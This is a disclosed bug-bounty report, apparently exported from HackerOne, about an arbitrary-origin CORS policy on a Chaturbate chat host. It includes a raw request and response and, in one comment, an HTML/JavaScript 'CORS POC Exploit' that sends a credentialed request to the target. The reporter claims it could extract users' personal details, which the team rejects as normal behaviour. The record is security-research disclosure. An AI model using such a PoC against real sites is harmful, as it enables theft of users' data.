{"id":417453,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC80MTc0NTM=","url":"https://hackerone.com/reports/417453","title":"Cross-origin resource sharing: arbitrary origin trusted on chatws25.stream.highwebmedia.com","state":"Closed","substate":"informative","severity_rating":"none","readable_substate":"Informative","created_at":"2018-10-02T09:08:38.677Z","submitted_at":"2018-10-02T09:08:38.677Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"mase289","url":"/mase289","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/Jtdoa8kr5dQCGweziHVGRTqs/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":30475,"url":"https://hackerone.com/chaturbate","handle":"chaturbate","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/030/475/178c32f60a890eb06ce5d698d44b3eafa35ccf8c_original.png/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/000/030/475/178c32f60a890eb06ce5d698d44b3eafa35ccf8c_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"Chaturbate","twitter_handle":"chaturbate","website":"https://chaturbate.com","about":"The largest online adult cam site"}},"has_bounty?":false,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":true,"disclosed_at":"2018-10-04T08:37:56.883Z","bug_reporter_agreed_on_going_public_at":"2018-10-04T08:02:26.345Z","team_member_agreed_on_going_public_at":"2018-10-04T08:37:56.817Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"*Very low-quality reports, such as those which only contain automated output, will be rejected.*\n\n##Summary##\nHi, i was able to discover a number of  instances on chatws25.stream.highwebmedia.com were the application accepts an arbitrarily supplied origin. \n\nThe application implements an HTML5 cross-origin resource sharing (CORS) policy for requests that allows access from any domain.  \nPOC\nThe application allowed access from the requested origin https://vazeeukllvua.com  \n\n## Steps To Reproduce:\n\n  1. Using an intercepting proxy , make the following request ;\nGET /ws/info HTTP/1.1\nHost: chatws25.stream.highwebmedia.com\nAccept-Encoding: gzip, deflate\nAccept: */*\nAccept-Language: en\nUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)\nConnection: close\nOrigin: https://vazeeukllvua.com\nCookie: __cfduid=dc7d8e518c8e0f8610c6c317c31c6f46e1538467160\n\n  2. Observe the following request which proves that the application is vulnerable:\nHTTP/1.1 200 OK\nDate: Tue, 02 Oct 2018 08:25:48 GMT\nContent-Type: application/json; charset=UTF-8\nConnection: close\nAccess-Control-Allow-Credentials: true\nAccess-Control-Allow-Origin: https://vazeeukllvua.com\nCache-Control: no-store, no-cache, must-revalidate, max-age=0\nExpect-CT: max-age=604800, report-uri=\"https://report-uri.cloudflare.com/cdn-cgi/beacon/expect-ct\"\nServer: cloudflare\nCF-RAY: 4635c7cb98c72ca2-MBA\nContent-Length: 79\n\n{\"websocket\":true,\"cookie_needed\":false,\"origins\":[\"*:*\"],\"entropy\":600356669}\n  1. [add step]\n\n\n## Supporting Material/References:\nhttps://cwe.mitre.org/data/definitions/942.html\nhttps://portswigger.net/blog/exploiting-cors-misconfigurations-for-bitcoins-and-bounties\n\n## Impact\n\nSince the Vary: Origin header was not present in the response, reverse proxies and intermediate servers may cache it. This may enable an attacker to carry out cache poisoning attacks.\n\nAn HTML5 cross-origin resource sharing (CORS) policy controls whether and how content running on other domains can perform two-way interaction with the domain that publishes the policy. The policy is fine-grained and can apply access controls per-request based on the URL and other features of the request.\n\nTrusting arbitrary origins effectively disables the same-origin policy, allowing two-way interaction by third-party web sites. Unless the response consists only of unprotected public content, this policy is likely to present a security risk.\nIf the site specifies the header Access-Control-Allow-Credentials: true, third-party sites may be able to carry out privileged actions and retrieve sensitive information. Even if it does not, attackers may be able to bypass any IP-based access controls by proxying through users' browsers","weakness":{"id":26,"name":"Improper Access Control - Generic"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":null,"vote_count":10,"voters":["ali","eveeez","an0nym0us","bb00x","mase289","0x08","wallotry","cyber29","armansameer","secp"],"severity":{"rating":"none","author_type":"Team"},"structured_scope":{"databaseId":11723,"asset_type":"URL","asset_identifier":"*.highwebmedia.com","max_severity":"critical"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":3420941,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi, i can confirm the above. Do let me know in case any further information is required.","automated_response":false,"created_at":"2018-10-02T13:21:46.571Z","updated_at":"2018-10-02T13:21:46.571Z","actor":{"username":"mase289","cleared":false,"url":"/mase289","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/Jtdoa8kr5dQCGweziHVGRTqs/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"chaturbate","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3427078,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thank you for submitting this report. In order to properly verify the existence of this misconfiguration, we ask you to provide a working proof of concept, ideally, an exploit that would demonstrate that the CORS misconfiguration can lead to the theft of user credentials, tokens, or other information that would cause an account takeover or trigger state-changing actions.","automated_response":false,"created_at":"2018-10-03T11:15:01.846Z","updated_at":"2018-10-03T11:15:01.846Z","actor":{"username":"pieceoftoast","cleared":false,"url":"/pieceoftoast","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/304/250/1d56f264cfce92a8f88b8424ce9dc273ab4bcd63_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"chaturbate","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3428043,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi, i tested again today and can't seem to detect the misconfiguration. Was this fixed? I was hoping to come up with a POC. From further research into the issue, it should be possible for an attacker to steal user details using the POC  below;\n\n\u003chtml\u003e\n\u003cbody\u003e\n\u003ccenter\u003e\n\u003ch2\u003eCORS POC Exploit\u003c/h2\u003e\n\u003ch3\u003eExtract SID\u003c/h3\u003e\n \n\u003cdiv id=\"demo\"\u003e\n\u003cbutton type=\"button\" onclick=\"cors()\"\u003eExploit\u003c/button\u003e\n\u003c/div\u003e\n \n\u003cscript\u003e\nfunction cors() {\n  var xhttp = new XMLHttpRequest();\n  xhttp.onreadystatechange = function() {\n    if (this.readyState == 4 \u0026\u0026 this.status == 200) {\n      document.getElementById(\"demo\").innerHTML = alert(this.responseText);\n    }\n  };\n  xhttp.open(\"GET\", \"https://chatws25.stream.highwebmedia.com/ws/info/\", true);\n  xhttp.withCredentials = true;\n  xhttp.send();\n}\n\u003c/script\u003e\n \n\u003c/body\u003e\n\u003c/html\u003e\n\nThe attacker would host the html file on a server they control and once a victim accessed the page, the attacker would extract details such as name , email, phone number among other details from the victim.","automated_response":false,"created_at":"2018-10-03T14:43:48.080Z","updated_at":"2018-10-03T14:43:48.080Z","actor":{"username":"mase289","cleared":false,"url":"/mase289","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/Jtdoa8kr5dQCGweziHVGRTqs/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"chaturbate","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3430824,"is_internal":false,"editable":false,"type":"Activities::ReportSeverityUpdated","message":"","automated_response":false,"created_at":"2018-10-03T21:39:53.046Z","updated_at":"2018-10-03T21:39:53.046Z","additional_data":{"old_severity":"High","new_severity":"None","old_severity_id":218047,"new_severity_id":219287},"actor":{"username":"williammmllc","cleared":false,"url":"/williammmllc","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"chaturbate","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":3430826,"is_internal":false,"editable":false,"type":"Activities::BugInformative","message":"Thanks for the report. The chat is designed to be able to be connected to from any domain. Are you able to show a poc of it being abused? Your current poc is showing normal behaviour.\n\n","automated_response":false,"created_at":"2018-10-03T21:39:57.782Z","updated_at":"2018-10-03T21:39:57.782Z","actor":{"username":"williammmllc","cleared":false,"url":"/williammmllc","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"chaturbate","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":3432497,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"Not at the moment, no. Can i request for disclosure?. Perhaps somebody else might be able to go further with this.\n","automated_response":false,"created_at":"2018-10-04T08:02:26.381Z","updated_at":"2018-10-04T08:02:26.381Z","first_to_agree":true,"actor":{"username":"mase289","cleared":false,"url":"/mase289","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/Jtdoa8kr5dQCGweziHVGRTqs/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"chaturbate","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3432754,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2018-10-04T08:37:56.848Z","updated_at":"2018-10-04T08:37:56.848Z","actor":{"username":"williammmllc","cleared":false,"url":"/williammmllc","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"chaturbate","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":3432755,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","automated_response":false,"created_at":"2018-10-04T08:37:56.903Z","updated_at":"2018-10-04T08:37:56.903Z","actor":{"username":"williammmllc","cleared":false,"url":"/williammmllc","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"chaturbate","actor_is_team_member":true,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}